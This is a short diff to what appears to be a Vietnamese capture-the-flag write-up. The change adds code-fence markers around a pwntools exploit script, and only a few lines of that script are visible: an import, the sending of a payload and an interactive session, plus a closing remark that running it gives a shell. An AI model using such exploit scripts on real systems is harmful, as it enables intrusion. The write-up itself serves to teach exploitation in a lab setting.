@@ -69,6 +69,7 @@
 
 - Kết hợp tất cả thông tin rồi ta sẽ viết được script này
 
+'''python
 
     from pwn import *
     
@@ -105,5 +106,5 @@
     p.sendafter(b'> ', payload)
     p.interactive()
     
-
+'''
 - Chạy thử và ta sẽ có được shell.
